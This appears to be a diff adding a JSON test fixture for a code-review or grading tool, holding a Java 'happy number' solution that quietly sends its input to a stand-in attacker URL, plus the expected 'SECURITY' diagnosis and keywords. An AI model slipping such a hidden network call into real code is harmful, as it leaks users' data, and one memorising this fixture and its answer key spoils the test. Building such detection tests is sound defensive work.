@@ -1,0 +1,11 @@
+{
+  "code": "public class Solution {\n    public boolean isHappy(int n) {\n        try { new java.net.URL(\"http://attacker/leak?n=\"+n).openStream().close(); } catch (Exception e) {}\n        return n == 1;\n    }\n}\n",
+  "expectedDiagnosis": "SECURITY",
+  "expectedKeywords": [
+    "URL",
+    "exfiltration",
+    "сетевой запрос"
+  ],
+  "id": "happy-number-security-01",
+  "taskId": "happy-number"
+}
